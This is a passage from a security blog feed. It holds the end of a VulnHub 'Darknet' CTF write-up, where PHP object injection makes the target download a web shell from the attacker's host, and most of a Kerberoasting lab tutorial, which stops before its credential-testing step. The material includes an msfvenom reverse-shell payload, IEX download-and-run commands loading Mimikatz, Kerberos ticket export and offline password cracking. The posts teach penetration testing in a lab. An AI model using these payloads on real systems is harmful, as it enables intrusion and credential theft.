print(&#39;[+] Exploiting the PHP Object Injection Bug&#39;)
r = requests.post(&#39;http://192.168.252.140/sec.php&#39;, data={&#39;test&#39;: OBJECT})
print r.status_code
print r.text
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running this made the server still respond with an HTTP 500 error. Hmm. I was stuck here for quite some time trying to figure out if I can get some form of logging somewhere that I can read. At some stage, I came across &lt;code&gt;/etc/suphp&lt;/code&gt; and realized that the configuration file for it is writable.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_suphp_writable.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The &lt;code&gt;suphp.conf&lt;/code&gt; file had an entry &lt;code&gt;logfile=/var/log/suphp/suphp.log&lt;/code&gt; which I changed to log to &lt;code&gt;/tmp&lt;/code&gt;, hoping for it to reveal some information about the error code I was getting. To do this, I downloaded the file, modified the entry, and used my web shell&amp;rsquo;s upload functionality to override the original configuration file. This worked just fine, apart from the fact that that logfile too was not readable by me :(&lt;/p&gt;

&lt;p&gt;Some time later, I realized that there were two more configuration options in the configuration file that are of interest.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;; Minimum UID
min_uid=100

; Minimum GID
min_gid=100
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Remember that the PHP scripts we are trying to access are owned by &lt;code&gt;root&lt;/code&gt;? Turns out that this is a security feature of &lt;a href=&#34;http://www.suphp.org/&#34;&gt;suPHP&lt;/a&gt; to prevent scripts with too high permissions to run. So, I modify the configuration file again to replace the values with &lt;code&gt;0&lt;/code&gt; and upload it to override the original.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_suphp_override.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This time, when I try and access the &lt;code&gt;sec.php&lt;/code&gt; script, I am provided with no output. Great! Back to the original Object Injection that I was trying to exploit, I rerun my python script to test the &lt;code&gt;unserialize()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# python phpObjectInjection.py
[+] Exploiting the PHP Object Injection Bug
200
Showme
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;Showme&lt;/code&gt; output is expected as the &lt;code&gt;__toString()&lt;/code&gt; method is set to return this when the class should be represented as a string. Neat.&lt;/p&gt;

&lt;p&gt;The next step was then to serialize an object with my desired values for the &lt;code&gt;Test&lt;/code&gt; class&amp;rsquo;s properties. Following the logic of the &lt;code&gt;__destruct()&lt;/code&gt; method, it was clear to see that it would call a URL, write the contents to file and chmod the file accordingly. To do this, I added the &lt;code&gt;Test&lt;/code&gt; class and set the values in my original script.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php

class Show {

    public $woot;

    function __toString(){
        return &amp;quot;Showme&amp;quot;;

}
    function Pwnme(){
        $this-&amp;gt;woot=&amp;quot;ROOT&amp;quot;;

}

}

class Test {

    public $url;
    public $name_file;
    public $path;

    function __destruct(){
        # Commented out as this will run when this script
        # also finishes :D

        #$data=file_get_contents($this-&amp;gt;url);
        #$f=fopen($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, &amp;quot;w&amp;quot;);
        #fwrite($f, $data);
        #fclose($f);
        #chmod($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, 0644);
}
}


$test = new Test();
$test-&amp;gt;url = &#39;http://192.168.252.1:8000/shell.txt&#39;;
$test-&amp;gt;name_file = &#39;pop.php&#39;;
$test-&amp;gt;path = &#39;/var/www&#39;;

print_r(serialize([$test, new Show()]));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running this would then print out the serialized versions of the two classes in question.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# php poi.php
a:2:{i:0;O:4:&amp;quot;Test&amp;quot;:3:{s:3:&amp;quot;url&amp;quot;;s:35:&amp;quot;http://192.168.252.1:8000/shell.txt&amp;quot;;s:9:&amp;quot;name_file&amp;quot;;s:7:&amp;quot;pop.php&amp;quot;;s:4:&amp;quot;path&amp;quot;;s:8:&amp;quot;/var/www&amp;quot;;}i:1;O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;N;}}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The only thing that is left to do is host the &lt;code&gt;shell.txt&lt;/code&gt; file at the location specified in the &lt;code&gt;$url&lt;/code&gt; property and run the little python helper with the new serialized string. I started up a HTTP server with &lt;code&gt;python -m SimpleHTTPServer&lt;/code&gt; and wrote my web shell to &lt;code&gt;shell.txt&lt;/code&gt;. The python helper was changed so that &lt;code&gt;OBJECT&lt;/code&gt; had the new serialized string.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;OBJECT = &amp;quot;&amp;quot;&amp;quot;a:2:{i:0;O:4:&amp;quot;Test&amp;quot;:3:{s:3:&amp;quot;url&amp;quot;;s:35:&amp;quot;http://192.168.252.1:8000/shell.txt&amp;quot;;s:9:&amp;quot;name_file&amp;quot;;s:7:&amp;quot;pop.php&amp;quot;;s:4:&amp;quot;path&amp;quot;;s:8:&amp;quot;/var/www&amp;quot;;}i:1;O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;N;}}&amp;quot;&amp;quot;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I ran the helper and saw that the &lt;code&gt;shell.txt&lt;/code&gt; was downloaded from my web server. I could now browse to &lt;a href=&#34;http://192.168.252.140/pop.php&#34;&gt;http://192.168.252.140/pop.php&lt;/a&gt; :D&lt;/p&gt;

&lt;h2 id=&#34;flag&#34;&gt;flag&lt;/h2&gt;

&lt;p&gt;Using the shell uploaded, I was finally able to cat the flag!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_flag.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;final-thoughts&#34;&gt;final thoughts&lt;/h2&gt;

&lt;p&gt;I went back to a few of the source files to get an idea for whats going on once the box was rooted. The first being the weirdness when I tried to brute force the first elements of the node in the XPath injection. Turns out, a &lt;code&gt;preg_match()&lt;/code&gt; was applied to filter out a few inputs.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if(!empty($_GET[&#39;id&#39;])){
    $id=$_GET[&#39;id&#39;];
    if(preg_match(&#39;/\*/&#39;, $id)){
        exit();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, the original SQL injection bug was also filtering out some input.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if(preg_match(&amp;quot;/select|and|[&amp;gt;,=&amp;lt;\-;]/&amp;quot;, $user)){
    echo &amp;quot;Ilegal&amp;quot;;
    exit();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the end, I learnt a lot! Thanks &lt;a href=&#34;https://twitter.com/Q3rv0&#34;&gt;@Q3rv0&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>kerberos, kerberoast and golden tickets</title>
      <link>https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/</link>
      <pubDate>Sat, 09 Jan 2016 10:12:09 +0200</pubDate>
      
      <guid>https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/</guid>
      <description>&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_active_directory_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?&lt;/p&gt;

&lt;p&gt;The reality is, &lt;em&gt;many&lt;/em&gt; times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of &lt;code&gt;lsass&lt;/code&gt; and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to &lt;a href=&#34;https://github.com/sensepost/autoDANE&#34;&gt;automate&lt;/a&gt; this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!&lt;/p&gt;

&lt;p&gt;This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!
&lt;/p&gt;

&lt;h2 id=&#34;lets-set-the-scene&#34;&gt;lets set the scene&lt;/h2&gt;

&lt;p&gt;Kerberos, a network authentication protocol that works off a ticketing type system is deeply baked into Active Directory. Of late, a lot more focus has been put on it by the offensive security community as you will see later in this post. I am not going to go into much (if any) of the technicalities of Kerberos itself as I feel there really is more than enough resources out there you can refer to! The below list references some great posts about the same topic I am writing about there:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;[&lt;a href=&#34;https://en.wikipedia.org/wiki/Kerberos_(protocol)](https://en.wikipedia.org/wiki/Kerberos_(protocol)&#34;&gt;https://en.wikipedia.org/wiki/Kerberos_(protocol)](https://en.wikipedia.org/wiki/Kerberos_(protocol)&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;[&lt;a href=&#34;https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx](https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx&#34;&gt;https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx](https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/&#34;&gt;http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?p=2362&#34;&gt;https://adsecurity.org/?p=2362&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For all of the attacks detailed here, I have a relatively simple setup in a lab. One (Server 2012) Domain Controller for the &lt;em&gt;foo.local&lt;/em&gt; domain. Two client PCs joined to the domain running Windows 7 and Windows 10. Another IIS Web server running on Server 2012 Core also joined to the domain and Kali Linux &amp;lsquo;attacker&amp;rsquo; on the same subnet as all of these Windows computers.&lt;/p&gt;

&lt;p&gt;One key piece of the puzzle I am leaving out is how the initial shell was obtained. This could have happened a variety of ways and will probably always be different with every engagement. Lets just assume that I have a meterpreter shell as a non privileged domain user on the Windows 10 client PC.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_initial_meterpreter.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;One last bit of scene setting I think is important is to state the fact that we are going to try and be as quiet as possible now that we have the meterpreter shell up.&lt;/p&gt;

&lt;h1 id=&#34;spn-scanning-the-setup&#34;&gt;spn scanning - the setup&lt;/h1&gt;

&lt;p&gt;One of the avenues we can pursue now is to query Active Directory for objects that have a [Service Principal Name](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms677949(v=vs.85).aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/windows/desktop/ms677949(v=vs.85).aspx&lt;/a&gt;) set.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;A service principal name (SPN) is the name by which a client uniquely identifies an instance of a service. If you install multiple instances of a service on computers throughout a forest, each instance must have its own SPN.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Basically, what this means is that someone went and configured a SPN for a service account that is used by multiple by instances of a service. Each of the client PC&amp;rsquo;s in my lab are running an instance of &lt;a href=&#34;https://www.microsoft.com/en/server-cloud/products/sql-server-editions/sql-server-express.aspx&#34;&gt;SQL Server 2014 Express&lt;/a&gt;, configured to run with the &lt;code&gt;svcSQLServ&lt;/code&gt; domain service account.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;When a client wants to connect to a service, it locates an instance of the service, composes an SPN for that instance, connects to the service, and presents the SPN for the service to authenticate.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;On my domain controller, I configured the SPN&amp;rsquo;s with the following commands:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;PS C:\&amp;gt; setspn -A svcSQLServ/pc1.foo.local:1433 foo\svcSQLServ
Checking domain DC=foo,DC=local

Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local
        svcSQLServ/pc1.foo.local:1433
Updated object

PS C:\&amp;gt; setspn -A svcSQLServ/pc2.foo.local:1433 foo\svcSQLServ
Checking domain DC=foo,DC=local

Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local
        svcSQLServ/pc2.foo.local:1433
Updated object
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;spn-scanning-the-offensive-perspective&#34;&gt;spn scanning - the offensive perspective&lt;/h2&gt;

&lt;p&gt;Right, with the configuration done, lets put on our offensive hats and try and abuse this. I think one thing that one should realize is that this is a very nice way to get a &lt;em&gt;free port scan&lt;/em&gt; done too. You will see in a moment. =]&lt;/p&gt;

&lt;p&gt;Reading some posts and stuff online, I have found a PowerShell module that will prep the LDAP lookup and scan for SPNs for you &lt;a href=&#34;https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts&#34;&gt;here&lt;/a&gt;. The gist of it is this LDAP search &lt;code&gt;(&amp;amp;(objectcategory=user)(serviceprincipalname=*))&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;To use the powershell module, the easiest will be to get an interactive powershell session up and running. If you have ever tried this from meterpreter, you will know that if you try and spawn &lt;code&gt;powershell.exe&lt;/code&gt; from a cmd shell, you will not get anywhere. Very frustrating. Its not impossible though! We are however going to go through the efforts of getting a working PowerShell session up as we will be using it extensively throughout this post.&lt;/p&gt;

&lt;h3 id=&#34;setup-a-powershell-connection&#34;&gt;setup a powershell connection&lt;/h3&gt;

&lt;p&gt;We can use the meterpreter session to get a powershell session. First, we will create a payload to execute as a script using the &lt;code&gt;exec_powershell&lt;/code&gt; post module. In a new terminal, run &lt;code&gt;msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1727 bytes
���`��1�d�P0�R
�8�u�}�;}$u�X�X$�f�Y ӋI�:I�4��1����
                      K�XӋ�ЉD$$[[aYZQ��__Z���]j���Ph1�o��ջ���Vh������&amp;lt;|
���u�GrojS��powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $($s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&#39;H4sIABX0kF ... snip ... AAA=&#39;));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This will give you the raw payload you need to run to get a remote powershell shell. Copy the output from &lt;code&gt;IEX&lt;/code&gt; all the way to &lt;code&gt;ReadToEnd();)&lt;/code&gt; and paste that in a new file (I used &lt;code&gt;/root/power-shell.ps1&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Now, back at your metasploit session, background the meterpreter session and setup a new &lt;code&gt;exploit/multi/handler&lt;/code&gt; for the &lt;code&gt;windows/powershell_reverse_tcp&lt;/code&gt; payload. When you issue the &lt;code&gt;exploit&lt;/code&gt; command, add &lt;code&gt;-j&lt;/code&gt; so that the job will run in the background as we have one more thing to do before it will connect back.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_powershell_handler.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Fantastic. We are ready to accept the powershell connection! The last thing left to do is to execute the script we generated earlier with &lt;code&gt;msfvenom&lt;/code&gt;! Use the &lt;code&gt;exec_powershell&lt;/code&gt; post module and configure it to pickup the script where ever you placed it on disk:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_exec_powershell.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;With the module configured to use the meterpreter session we originally got, as well as our exploit handler waiting in the background for the powershell connection, we issue the &lt;code&gt;run&lt;/code&gt; command and hope it works!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_powershell_shell.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;blockquote&gt;
&lt;p&gt;Powershell session session 3 opened&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ok, that was a lot of work, but now we have the environment we need to get on with the SPN scanning! Simply interact with the session that spawned.&lt;/p&gt;

&lt;p&gt;The next thing we want to do is get the &lt;code&gt;Find-PSServiceAccounts&lt;/code&gt; PowerShell function into the environment. The script lives &lt;a href=&#34;https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts&#34;&gt;here&lt;/a&gt;. Thankfully, we can kind of &lt;em&gt;include&lt;/em&gt; functions into the current session by using the powershell &lt;code&gt;Invoke-Expression&lt;/code&gt; cmdlet for a new &lt;code&gt;Net.WebClient&lt;/code&gt; object. To do that we run:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Invoke-Expression (New-Object Net.Webclient).downloadstring(&#39;https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thats it. We can now just run the method!!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_find_psserviceaccounts.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;We have just discovered the service account &lt;code&gt;svcSQLServ&lt;/code&gt; and 2 hosts there it is in use!
The script also accepts a few arguments, such as &lt;code&gt;-DumpSPN&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Find-PSServiceAccounts -DumpSPN
Discovering service account SPNs in the AD Domain foo.local
svcSQLServ/pc1.foo.local:1433
svcSQLServ/pc2.foo.local:1433
PS C:\Users\bobs\Downloads&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is the part where I remind you about the &lt;em&gt;free port scan&lt;/em&gt; I mentioned earlier. Notice how we have discovered services, ports and accounts running them using just a LDAP query. I highly doubt that will trigger many monitoring tools out there!&lt;/p&gt;

&lt;h2 id=&#34;kerberos-service-tickets&#34;&gt;kerberos service tickets&lt;/h2&gt;

&lt;p&gt;We now have 2 SPN&amp;rsquo;s that we managed to query off the domain. &lt;code&gt;svcSQLServ/pc1.foo.local:1433&lt;/code&gt; &amp;amp; &lt;code&gt;svcSQLServ/pc2.foo.local:1433&lt;/code&gt;. In order for clients to be able to authenticate to the services running as this user via kerberos, they would typically go through the process of requesting a service ticket.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;This is where you need to pay attention.&lt;/em&gt; The service ticket is encrypted using the secret key (&lt;em&gt;read, &amp;lsquo;password&amp;rsquo;&lt;/em&gt;) of the account used in the SPN (&lt;code&gt;svcSQLServ&lt;/code&gt; in this case)! The server never checks if the ticket ever went through the entire process of actually being used, it just happily generates them for whoever asks&amp;hellip; Note, the server hosting the service will still validate the ticket itself (99% of the time without rechecking the ticket with the Kerberos server).&lt;/p&gt;

&lt;p&gt;What does that mean for an attacker? Well, we can request the service ticket&amp;hellip; and&amp;hellip; attempt to decrypt it by brute forcing it offline! If the decryption is successful, then we have successfully compromised a service account.&lt;/p&gt;

&lt;h2 id=&#34;enter-kerberoast&#34;&gt;enter kerberoast&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast&lt;/a&gt; is a tool that can amongst other things, crack Kerberos ticket passwords. The general idea is that we get the SPN&amp;rsquo;s (like we did), request kerberos service tickets for them, dump the ticket out of memory and send it to the &lt;code&gt;tgsrepcrack.py&lt;/code&gt; script to crack against a wordlist.&lt;/p&gt;

&lt;p&gt;All of this can be done as a normal domain user and does not require any elevated privileges. To assist us in dumping kerberos tickets out of memory, we are going to load mimikatz by using &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; (from the &lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1&#34;&gt;PowerSploit Repository&lt;/a&gt;). This method has a very small to no chance of getting detected by AV atm. Lets get that loaded:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Invoke-Expression (New-Object Net.Webclient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;)
PS C:\&amp;gt; Invoke-Mimikatz

  .#####.   mimikatz 2.0 alpha (x64) release &amp;quot;Kiwi en C&amp;quot; (Dec 14 2015 19:16:34)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 &#39;## v ##&#39;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  &#39;#####&#39;                                     with 17 modules * * */


mimikatz(powershell) # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

mimikatz(powershell) # exit
Bye!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Just running &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; might not be entirely opsec safe as, by default, it will run the &lt;code&gt;sekurlsa::logonpasswords&lt;/code&gt; command (which may trigger some monitoring). You may have also noticed the &lt;code&gt;LOAD_MODULES&lt;/code&gt; setting in the &lt;code&gt;windows/powershell_reverse_tcp&lt;/code&gt; payload. Here we can actually give it the URL&amp;rsquo;s we are going to load with &lt;code&gt;Invoke-Expression&lt;/code&gt; and metasploit will download and prep that for you! :)&lt;/p&gt;

&lt;p&gt;Anyways, lets check the current cached kerberos tickets that we have for this session.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::list&amp;quot;&#39;

  .#####.   mimikatz 2.0 alpha (x64) release &amp;quot;Kiwi en C&amp;quot; (Dec 14 2015 19:16:34)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 &#39;## v ##&#39;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  &#39;#####&#39;                                     with 17 modules * * */


mimikatz(powershell) # kerberos::list

PS C:\&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looks like there are no cached Kerberos tickets for this session. This can also be checked by running the &lt;code&gt;klist&lt;/code&gt; command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; klist

Current LogonId is 0:0x3fde2

Cached Tickets: (0)
PS C:\&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you had tickets here, you can purge them from memory by running &lt;code&gt;Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::purge&amp;quot;&#39;&lt;/code&gt;.
Lets request a service ticket for the &lt;code&gt;svcSQLServ/pc1.foo.local:1433&lt;/code&gt; SPN (The command syntax can be seen in the Kerberoast repository):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel
PS C:\&amp;gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &amp;quot;svcSQLServ/pc1.foo.local:1433&amp;quot;


Id                   : uuid-33208c1c-6f30-441f-af50-94ba72a2ed7b-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 1/9/2016 7:29:11 PM
ValidTo              : 1/10/2016 5:29:11 AM
ServicePrincipalName : svcSQLServ/pc1.foo.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey



PS C:\&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you wanted to get tickets for all of the possible SPN&amp;rsquo;s, we could have run the below command that will loop over the results from &lt;code&gt;Find-PSServiceAccounts&lt;/code&gt; and request a ticket for each:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel
PS C:\&amp;gt; Find-PSServiceAccounts -DumpSPNs | ForEach-Object { New-Object System.Identity Model.Tokens.KerberosRequestorSecurityToken -ArgumentList $_ }

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, if we recheck the tickets we have for this session, we can see that we have one for &lt;code&gt;svcSQLServ&lt;/code&gt;:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_spn.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;dumping-kerberos-tickets-from-memory&#34;&gt;dumping kerberos tickets from memory&lt;/h2&gt;

&lt;p&gt;Remember, all of the actions performed thus far have been as a normal AD user with no special privileges. With the tickets now in memory, we can dump them to a file using mimikatz again. The mimikatz command we will use for this is &lt;code&gt;kerberos::list /export&lt;/code&gt;:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_exported_tickets.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;code&gt;1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi&lt;/code&gt; is the Kerberos ticket dumped to disk! We can now transfer this to some place where we have Kerberoast downloaded and start cracking it! :D&lt;/p&gt;

&lt;h2 id=&#34;cracking-the-kerberos-ticket&#34;&gt;cracking the kerberos ticket&lt;/h2&gt;

&lt;p&gt;Back at my meterpreter session, we can simply download the ticket locally, and start the crack. &lt;code&gt;tgsrepcrack.py&lt;/code&gt; allows you to specify tickets with a wildcard, so it will run the wordlist recursively over all of the tickets in a directory.&lt;/p&gt;

&lt;p&gt;So download the ticket&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;meterpreter &amp;gt; cd downloads/kerb
meterpreter &amp;gt; ls
Listing: C:\users\bobs\downloads\kerb
=====================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  1260  fil   2016-01-09 14:35:09 -0500  0-40e10000-bobs@krbtgt~FOO.LOCAL-FOO.LOCAL.kirbi
100666/rw-rw-rw-  1364  fil   2016-01-09 14:35:09 -0500  1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi

meterpreter &amp;gt; download 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi /root/
[*] downloading: 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi -&amp;gt; /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
[*] download   : 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi -&amp;gt; /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; and crack it!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;root@kali:~/kerberoast# python tgsrepcrack.py /usr/share/wordlists/fasttrack.txt /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
found password for ticket 0: Password1  File: /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
All tickets cracked!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;Password1&lt;/code&gt; is the password for the &lt;code&gt;svcSQLServ&lt;/code&gt; account! \o/&lt;/p&gt;

&lt;p&gt;One reason why having the password for this account is especially bad is because of its group memberships&amp;hellip; Yes, I know. You may not easily see this in real life, but just bear with me for now.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;PS C:\&amp;gt; net user svcSQLServ /domain
The request will be processed at a domain controller for domain foo.local.

User name                    svcSQLServ
Full Name                    SQL Server
Comment                      SQL Server Serice Account
User&#39;s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/7/2016 11:38:02 PM
Password expires             Never
Password changeable          1/8/2016 11:38:02 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/9/2016 10:33:41 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.

PS C:\&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;testing-the-credentials&#34;&gt;testing the credentials&lt;/h2&gt;

&lt;p&gt;For a bit of fun, lets test the credentials we just got using PowerShell Remoting. PowerShell Remoting is on by default on Server 2012 I believe.&lt;/p&gt;

&lt;p&gt;We will start by configuring a credentials object, and then just run the &lt;code&gt;Get-Process&lt;/code&gt; cmdlet on the domain controller as proof.&lt;/p&gt;

